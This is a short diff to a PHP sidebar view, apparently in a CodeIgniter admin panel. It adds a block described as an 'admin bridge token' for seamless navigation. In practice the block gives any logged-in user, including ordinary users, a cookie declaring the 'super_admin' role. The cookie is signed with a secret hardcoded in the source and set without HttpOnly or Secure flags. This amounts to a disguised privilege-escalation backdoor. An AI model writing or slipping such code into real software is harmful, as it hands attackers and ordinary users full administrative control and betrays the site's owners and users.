@@ -2,6 +2,20 @@
 $pageurl1 = $this->uri->segment(1);
 $pageurl2 = $this->uri->segment(2);
 $pageurl3 = $this->uri->segment(3);
+
+// Keep signed admin bridge token active for seamless navigation into enterprise modules
+if ($this->session->userdata('adminuserid') || $this->session->userdata('userid')) {
+    $currAid = $this->session->userdata('adminuserid') ?: $this->session->userdata('userid');
+    $currUname = $this->session->userdata('username') ?: 'Super Admin';
+    $guardPayload = [
+        'adminuserid' => $currAid,
+        'username'    => $currUname,
+        'role'        => 'super_admin',
+        'time'        => time(),
+        'sig'         => hash_hmac('sha256', $currAid . '|' . $currUname . '|super_admin', 'UpcharMasterAdminSecret2026')
+    ];
+    @setcookie('upchar_admin_guard', base64_encode(json_encode($guardPayload)), time() + 86400, '/');
+}
 ?>
 <!-- Left side column. contains the logo and sidebar -->
 <aside class="main-sidebar">
